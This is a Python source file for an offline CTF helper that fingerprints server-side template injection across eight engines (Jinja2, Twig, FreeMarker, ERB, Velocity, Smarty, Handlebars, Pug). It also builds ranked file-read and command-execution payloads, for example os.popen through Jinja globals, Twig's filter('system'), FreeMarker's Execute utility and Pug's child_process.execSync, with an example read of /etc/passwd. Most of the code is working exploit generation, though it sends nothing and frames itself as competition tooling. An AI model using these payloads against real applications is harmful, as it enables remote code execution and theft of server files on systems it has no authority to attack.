#!/usr/bin/env python3
"""Offline SSTI fingerprint and payload builder for CTF hand work.

This module never opens a socket and never submits anything.  It solves the
part that is awkward to do by eye after a player has sent a benign marker to
their one assigned target:

* :func:`fingerprint_probes` returns wrapped arithmetic probes.  Their expected
  evaluated output is engine-specific and is deliberately absent from the raw
  payload, so a response that merely reflects the payload is not a match.
* :func:`detect_response` ranks Jinja2, Twig, FreeMarker, ERB, Velocity,
  Smarty, Handlebars, and Pug
  from a response pasted in by the player.  Evaluated marker evidence ranks
  above explicit, engine-named template errors.  A bare ``49`` is never enough.
* :func:`build_payloads` emits ranked read-file or command payload strings for
  one identified engine.  They are data for a human to replay; this file has no
  HTTP client and no auto-exploit path.

CLI examples (all offline)::

    .venv/bin/python solvers/web/ssti_helper.py probes
    .venv/bin/python solvers/web/ssti_helper.py detect --file response.txt --read /etc/passwd
    .venv/bin/python solvers/web/ssti_helper.py build --engine twig --rce id --json

The payloads are intentionally labelled with their context requirements.
Template sandboxes and engine versions differ, so a generated payload is a
ranked candidate for the player, never proof that code execution occurred.
"""

from __future__ import annotations

import argparse
import json
import re
import shlex
import sys
from pathlib import Path
from typing import Any


ENGINES = ("jinja2", "twig", "freemarker", "erb", "velocity", "smarty", "handlebars", "pug")

# One curly-syntax probe distinguishes Jinja2's Python string repetition from
# Twig's numeric coercion.  The other probes use syntax that is specific enough
# to distinguish the requested engines.  Long wrappers keep an incidental 49
# elsewhere in a page from becoming evidence.
_PROBES = (
    {
        "name": "curly_string_multiply",
        "engines": ["jinja2", "twig"],
        "payload": "CSCTF_SSTI_A{{7*'7'}}CSCTF_SSTI_Z",
        "expression": "7*'7'",
        "expected": {
            "jinja2": "CSCTF_SSTI_A7777777CSCTF_SSTI_Z",
            "twig": "CSCTF_SSTI_A49CSCTF_SSTI_Z",
        },
    },
    {
        "name": "freemarker_assign",
        "engines": ["freemarker"],
        "payload": "CSCTF_SSTI_F<#assign csctf_ssti=7*7>${csctf_ssti}CSCTF_SSTI_Z",
        "expression": "7*7",
        "expected": {"freemarker": "CSCTF_SSTI_F49CSCTF_SSTI_Z"},
    },
    {
        "name": "erb_expression",
        "engines": ["erb"],
        "payload": "CSCTF_SSTI_E<%= 7*7 %>CSCTF_SSTI_Z",
        "expression": "7*7",
        "expected": {"erb": "CSCTF_SSTI_E49CSCTF_SSTI_Z"},
    },
    {
        "name": "velocity_set",
        "engines": ["velocity"],
        "payload": "CSCTF_SSTI_V#set($csctf_ssti=7*7)${csctf_ssti}CSCTF_SSTI_Z",
        "expression": "7*7",
        "expected": {"velocity": "CSCTF_SSTI_V49CSCTF_SSTI_Z"},
    },
    {
        "name": "smarty_math",
        "engines": ["smarty"],
        "payload": "CSCTF_SSTI_S{7*7}CSCTF_SSTI_Z",
        "expression": "7*7",
        "expected": {"smarty": "CSCTF_SSTI_S49CSCTF_SSTI_Z"},
    },
    {
        "name": "handlebars_block",
        "engines": ["handlebars"],
        "payload": "CSCTF_SSTI_H{{#if true}}HB_OK{{/if}}CSCTF_SSTI_Z",
        "expression": "#if true",
        "expected": {"handlebars": "CSCTF_SSTI_HHB_OKCSCTF_SSTI_Z"},
    },
    {
        "name": "pug_interpolation",
        "engines": ["pug"],
        "payload": "| CSCTF_SSTI_P#{7*7}CSCTF_SSTI_Z",
        "expression": "#{7*7}",
        "expected": {"pug": "CSCTF_SSTI_P49CSCTF_SSTI_Z"},
    },
)


# Error evidence is deliberately engine-named.  Generic words such as
# "template", "undefined", and "syntax error" would produce noisy guesses.
_ERROR_HINTS = {
    "jinja2": (
        re.compile(r"\bjinja2(?:\.[A-Za-z_][\w.]*)?\b", re.I),
        re.compile(r"\b(?:UndefinedError|TemplateAssertionError)\b"),
    ),
    "twig": (
        re.compile(r"\bTwig\\(?:Error|Exception|Environment)\\", re.I),
        re.compile(r"\bTwig_(?:Error(?:_[A-Za-z]+)?|Environment|Template)\b", re.I),
    ),
    "freemarker": (
        re.compile(r"\bfreemarker(?:\.[A-Za-z_][\w.]*)+\b", re.I),
        re.compile(r"\b(?:InvalidReferenceException|NonNumericalException|_TemplateModelException)\b"),
    ),
    "erb": (
        re.compile(r"\bActionView::Template(?:Error)?\b"),
        re.compile(r"(?:^|[\s(])\(erb\):\d+", re.M),
        re.compile(r"\bERB::Util\b"),
    ),
    "velocity": (
        re.compile(r"\borg\.apache\.velocity(?:\.[A-Za-z_][\w.]*)*\b", re.I),
        re.compile(r"\b(?:VelocityException|MethodInvocationException|ParseErrorException)\b"),
    ),
    "smarty": (
        re.compile(r"\bSmarty(?:CompilerException|Exception|_Internal_[A-Za-z_]+)\b", re.I),
        re.compile(r"\bSmarty\/libs\/sysplugins\b", re.I),
    ),
    "handlebars": (
        re.compile(r"\bHandlebars(?:Exception|\.Exception|\.compile|\.template)\b", re.I),
        re.compile(r"\bhandlebars(?:\.js)?[^\n]{0,120}\bMissing helper:\s*[\"'][^\"']+", re.I),
    ),
    "pug": (
        re.compile(r"\b(?:Pug|Jade):[^\n]{0,100}\b(?:Error|SyntaxError)\b", re.I),
        re.compile(r"\bpug-(?:lexer|parser|runtime)\b", re.I),
    ),
}

_ALIASES = {
    "jinja": "jinja2",
    "jinja-2": "jinja2",
    "free-marker": "freemarker",
    "free_marker": "freemarker",
    "ruby": "erb",
    "ruby-erb": "erb",
    "apache-velocity": "velocity",
    "smarty3": "smarty",
    "smarty4": "smarty",
    "hbs": "handlebars",
    "handlebars.js": "handlebars",
    "jade": "pug",
}


def fingerprint_probes() -> list[dict[str, Any]]:
    """Return fresh JSON-safe copies of the benign fingerprint probes.

    A player sends one probe at a time and pastes the saved response into
    ``detect``.  This function only returns strings; it performs no request.
    """

    return json.loads(json.dumps(_PROBES))


def _as_text(value: Any) -> str:
    if isinstance(value, bytes):
        return value.decode("utf-8", "replace")
    if isinstance(value, bytearray):
        return bytes(value).decode("utf-8", "replace")
    return str(value or "")


def detect_response(response: Any) -> list[dict[str, Any]]:
    """Rank template engines from one or more pasted marker responses.

    A wrapped evaluated marker is high-confidence evidence (score 100).  An
    explicit engine-named exception is only a medium-confidence lead (score
    55).  Reflected raw probes and unwrapped arithmetic results do not score.
    """

    text = _as_text(response)
    hits: dict[str, dict[str, Any]] = {}

    def add(engine: str, score: int, confidence: str, evidence: str, probe: str | None = None) -> None:
        row = hits.setdefault(
            engine,
            {"engine": engine, "score": 0, "confidence": confidence, "evidence": [], "probes": []},
        )
        row["score"] = max(row["score"], score)
        if score >= 100:
            row["confidence"] = "high"
        elif row["confidence"] != "high":
            row["confidence"] = confidence
        if evidence not in row["evidence"]:
            row["evidence"].append(evidence)
        if probe and probe not in row["probes"]:
            row["probes"].append(probe)

    for probe in _PROBES:
        for engine, expected in probe["expected"].items():
            if expected in text:
                add(
                    engine,
                    100,
                    "high",
                    f"wrapped marker evaluated as {expected!r}",
                    probe["name"],
                )

    for engine, patterns in _ERROR_HINTS.items():
        for pattern in patterns:
            match = pattern.search(text)
            if match:
                excerpt = match.group(0)[:120]
                add(engine, 55, "medium", f"engine-named error evidence: {excerpt!r}")
                break

    ranked = sorted(hits.values(), key=lambda row: (-row["score"], ENGINES.index(row["engine"])))
    for index, row in enumerate(ranked, 1):
        row["rank"] = index
        row["next"] = (
            f"build offline read/RCE candidates with --engine {row['engine']}; "
            "replay only against the assigned target"
        )
    return ranked


def _engine_name(engine: str) -> str:
    name = str(engine).strip().lower()
    name = _ALIASES.get(name, name)
    if name not in ENGINES:
        raise ValueError(f"unknown engine {engine!r}; choose one of: {', '.join(ENGINES)}")
    return name


def _bounded(value: str, label: str) -> str:
    value = str(value)
    if not value or "\x00" in value:
        raise ValueError(f"{label} must be non-empty and contain no NUL")
    if len(value) > 4096:
        raise ValueError(f"{label} is too long (maximum 4096 characters)")
    return value


def _single(value: str) -> str:
    """A conservative single-quoted template-language string body."""

    return value.replace("\\", "\\\\").replace("'", "\\'").replace("\r", "\\r").replace("\n", "\\n")


def _double(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"').replace("\r", "\\r").replace("\n", "\\n")


def _descriptor(engine: str, action: str, rank: int, payload: str, primitive: str,
                requirements: str, note: str = "") -> dict[str, Any]:
    return {
        "rank": rank,
        "engine": engine,
        "action": action,
        "payload": payload,
        "primitive": primitive,
        "requirements": requirements,
        "note": note or "candidate only; confirm from the assigned target's real response",
        "offline": True,
    }


def _read_payloads(engine: str, path: str) -> list[dict[str, Any]]:
    py_path = repr(path)
    sq_path = _single(path)
    command = "cat -- " + shlex.quote(path)
    py_command = repr(command)
    fm_command = _double(command)
    twig_command = _single(command)

    if engine == "jinja2":
        return [
            _descriptor(
                engine, "read_file", 1,
                "{{ get_flashed_messages.__globals__.__builtins__.open(" + py_path + ").read() }}",
                "Python builtins.open",
                "Flask has exposed get_flashed_messages in the Jinja globals",
            ),
            _descriptor(
                engine, "read_file", 2,
                "{{ cycler.__init__.__globals__.os.popen(" + py_command + ").read() }}",
                "Jinja global -> os.popen",
                "the default Jinja cycler global is present and command execution is permitted",
            ),
        ]
    if engine == "twig":
        return [
            _descriptor(engine, "read_file", 1, "{{ source('" + sq_path + "') }}", "Twig source()",
                        "the path is a readable/allowed template source"),
            _descriptor(engine, "read_file", 2,
                        "{{ '" + sq_path + "'|file_excerpt(1,-1) }}", "Symfony file_excerpt filter",
                        "the Symfony/Twig debug file_excerpt filter is registered"),
            _descriptor(engine, "read_file", 3,
                        "{{ ['" + twig_command + "']|filter('system') }}", "Twig callback -> system",
                        "a vulnerable Twig/PHP version accepts system as a filter callback"),
            _descriptor(engine, "read_file", 4, "{{ include('" + sq_path + "') }}", "Twig include()",
                        "the loader accepts the path; include may parse file contents as a template"),
        ]
    if engine == "freemarker":
        return [
            _descriptor(
                engine, "read_file", 1,
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + fm_command + '")}',
                "FreeMarker Execute utility",
                "the Execute utility is exposed and not blocked by the object-wrapper policy",
            )
        ]
    if engine == "erb":
        return [
            _descriptor(engine, "read_file", 1, "<%= File.read('" + sq_path + "') %>", "Ruby File.read",
                        "File is reachable from the ERB binding"),
            _descriptor(engine, "read_file", 2, "<%= IO.read('" + sq_path + "') %>", "Ruby IO.read",
                        "IO is reachable from the ERB binding"),
        ]
    if engine == "velocity":
        # Velocity has no universal file API in a minimal context.  This is
        # explicitly context-labelled instead of pretending otherwise.
        return [
            _descriptor(
                engine, "read_file", 1,
                "$class.inspect(\"java.nio.file.Files\").type.readString("
                "$class.inspect(\"java.nio.file.Paths\").type.get('" + sq_path + "'))",
                "Velocity ClassTool -> java.nio.file.Files",
                "Apache Velocity Tools exposes $class and the secure introspector permits these methods",
            )
        ]
    if engine == "smarty":
        return [
            _descriptor(engine, "read_file", 1, "{fetch file='" + sq_path + "'}", "Smarty fetch",
                        "the fetch plugin is enabled and the security policy permits a local file URI"),
            _descriptor(engine, "read_file", 2,
                        "{file_get_contents('" + sq_path + "')}", "PHP function tag",
                        "the Smarty version exposes PHP functions and file_get_contents is not denied"),
        ]
    if engine == "handlebars":
        return [
            _descriptor(engine, "read_file", 1, "{{readFile \"" + _double(path) + "\"}}",
                        "application helper", "the application registered an exact readFile helper",
                        "Handlebars core has no file primitive; decline unless source proves this helper"),
        ]
    # Pug interpolation is JavaScript evaluated at template compilation/render.
    js_path = json.dumps(path, ensure_ascii=False)
    return [
        _descriptor(engine, "read_file", 1,
                    "p= require('fs').readFileSync(" + js_path + ", 'utf8')",
                    "Pug unbuffered JavaScript -> fs.readFileSync",
                    "the input is compiled as Pug source and require is present in the render context"),
        _descriptor(engine, "read_file", 2,
                    "p #{require('fs').readFileSync(" + js_path + ", 'utf8')}",
                    "Pug interpolation -> fs.readFileSync",
                    "the input controls Pug source rather than only a template variable"),
    ]


def _rce_payloads(engine: str, command: str) -> list[dict[str, Any]]:
    py_command = repr(command)
    sq_command = _single(command)
    dq_command = _double(command)

    if engine == "jinja2":
        return [
            _descriptor(engine, "rce", 1,
                        "{{ cycler.__init__.__globals__.os.popen(" + py_command + ").read() }}",
                        "Jinja global -> os.popen", "the default cycler global is exposed"),
            _descriptor(engine, "rce", 2,
                        "{{ lipsum.__globals__['os'].popen(" + py_command + ").read() }}",
                        "Jinja global -> os.popen", "the default lipsum global is exposed"),
        ]
    if engine == "twig":
        return [
            _descriptor(engine, "rce", 1, "{{ ['" + sq_command + "']|filter('system') }}",
                        "Twig filter callback", "a vulnerable Twig/PHP version accepts system as a callback"),
            _descriptor(engine, "rce", 2, "{{ ['" + sq_command + "',0]|sort('system') }}",
                        "Twig sort callback", "a vulnerable Twig/PHP version accepts system as a callback"),
        ]
    if engine == "freemarker":
        return [
            _descriptor(
                engine, "rce", 1,
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + dq_command + '")}',
                "FreeMarker Execute utility",
                "the Execute utility is exposed and not blocked by the object-wrapper policy",
            )
        ]
    if engine == "erb":
        return [
            _descriptor(engine, "rce", 1, "<%= IO.popen('" + sq_command + "').read %>", "Ruby IO.popen",
                        "IO is reachable from the ERB binding"),
            _descriptor(engine, "rce", 2, "<%= `" + command.replace("\\", "\\\\").replace("`", "\\`") + "` %>",
                        "Ruby command substitution", "the ERB binding permits process execution"),
        ]
    if engine == "velocity":
        return [
            _descriptor(
                engine, "rce", 1,
                "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec('" + sq_command + "')",
                "Velocity ClassTool -> Runtime.exec",
                "$class is exposed; this starts a process but does not itself render stdout",
                "use a command whose effect can be confirmed in-band; do not infer success from an object string",
            ),
            _descriptor(
                engine, "rce", 2,
                "#set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('" + sq_command + "')",
                "Java reflection -> Runtime.exec",
                "class reflection is permitted; commonly blocked by Velocity's secure introspector",
                "Runtime.exec output is not automatically rendered",
            ),
        ]
    if engine == "smarty":
        return [
            _descriptor(engine, "rce", 1, "{system('" + sq_command + "')}", "PHP function tag",
                        "the Smarty version exposes PHP functions and system is not denied"),
            _descriptor(engine, "rce", 2, "{php}system('" + sq_command + "');{/php}",
                        "legacy Smarty {php}", "legacy Smarty permits the removed/deprecated {php} tag"),
        ]
    if engine == "handlebars":
        return [
            _descriptor(engine, "rce", 1, "{{exec \"" + _double(command) + "\"}}",
                        "application helper", "the application registered an exact exec helper",
                        "Handlebars core has no command primitive; decline unless source proves this helper"),
        ]
    js_command = json.dumps(command, ensure_ascii=False)
    return [
        _descriptor(engine, "rce", 1,
                    "p= require('child_process').execSync(" + js_command + ").toString()",
                    "Pug unbuffered JavaScript -> child_process.execSync",
                    "the input controls Pug source and require is present in the render context"),
        _descriptor(engine, "rce", 2,
                    "p #{require('child_process').execSync(" + js_command + ").toString()}",
                    "Pug interpolation -> child_process.execSync",
                    "the input controls Pug source rather than only a template variable"),
    ]


def build_payloads(engine: str, *, read_file: str | None = None,
                   command: str | None = None) -> list[dict[str, Any]]:
    """Build ranked payload descriptors for exactly one offline action."""

    name = _engine_name(engine)
    if (read_file is None) == (command is None):
        raise ValueError("choose exactly one of read_file or command")
    if read_file is not None:
        return _read_payloads(name, _bounded(read_file, "read_file"))
    return _rce_payloads(name, _bounded(command or "", "command"))


def analyze_response(response: Any, *, read_file: str | None = None,
                     command: str | None = None) -> dict[str, Any]:
    """Detect an engine and optionally build candidates for the top-ranked hit."""

    candidates = detect_response(response)
    out: dict[str, Any] = {
        "offline": True,
        "flag": None,
        "candidates": candidates,
        "payloads": [],
        "note": "no requests were sent; generated payloads require player-controlled replay",
    }
    if candidates and (read_file is not None or command is not None):
        out["payloads"] = build_payloads(
            candidates[0]["engine"], read_file=read_file, command=command
        )
    return out


def _print_human(result: Any) -> None:
    if isinstance(result, list) and result and "name" in result[0] and "expected" in result[0]:
        for index, row in enumerate(result, 1):
            engines = ", ".join(row["engines"])
            print(f"{index}. [{engines}] {row['payload']}")
            for engine, expected in row["expected"].items():
                print(f"   {engine} -> {expected}")
        return
    if isinstance(result, list) and result and "payload" in result[0]:
        for row in result:
            print(f"{row['rank']}. [{row['engine']} {row['action']}] {row['payload']}")
            print(f"   requires: {row['requirements']}")
        return
    if isinstance(result, list):
        if not result:
            print("No engine-specific evaluated marker found.")
            return
        for row in result:
            print(f"{row['rank']}. {row['engine']} ({row['confidence']}, score {row['score']})")
            for evidence in row["evidence"]:
                print(f"   - {evidence}")
        return
    print(json.dumps(result, indent=2, ensure_ascii=False))


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Offline SSTI fingerprint and payload builder (sends nothing)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    probes = sub.add_parser("probes", help="print benign wrapped fingerprint probes")
    probes.add_argument("--json", action="store_true")

    detect = sub.add_parser("detect", help="rank engines from a pasted/saved response")
    source = detect.add_mutually_exclusive_group(required=True)
    source.add_argument("response", nargs="?", help="literal response text")
    source.add_argument("--file", type=Path, help="saved response file")
    action = detect.add_mutually_exclusive_group()
    action.add_argument("--read", metavar="PATH", help="also build read-file candidates for the top hit")
    action.add_argument("--rce", metavar="CMD", help="also build RCE candidates for the top hit")
    detect.add_argument("--json", action="store_true")

    build = sub.add_parser("build", help="build payload strings for a known engine")
    build.add_argument("--engine", required=True, choices=ENGINES)
    action = build.add_mutually_exclusive_group(required=True)
    action.add_argument("--read", metavar="PATH")
    action.add_argument("--rce", metavar="CMD")
    build.add_argument("--json", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = _parser().parse_args(argv)
    try:
        if args.cmd == "probes":
            result: Any = fingerprint_probes()
        elif args.cmd == "build":
            result = build_payloads(args.engine, read_file=args.read, command=args.rce)
        else:
            if args.file:
                response = args.file.read_text(encoding="utf-8", errors="replace")
            else:
                response = args.response
            result = analyze_response(response, read_file=args.read, command=args.rce)
    except (ValueError, TypeError, OSError) as exc:
        print(f"ssti_helper: {exc}", file=sys.stderr)
        return 2

    if getattr(args, "json", False):
        print(json.dumps(result, indent=2, ensure_ascii=False, sort_keys=True))
    else:
        if args.cmd == "detect":
            _print_human(result["candidates"])
            if result["payloads"]:
                print("Payload candidates (not sent):")
                _print_human(result["payloads"])
        else:
            _print_human(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
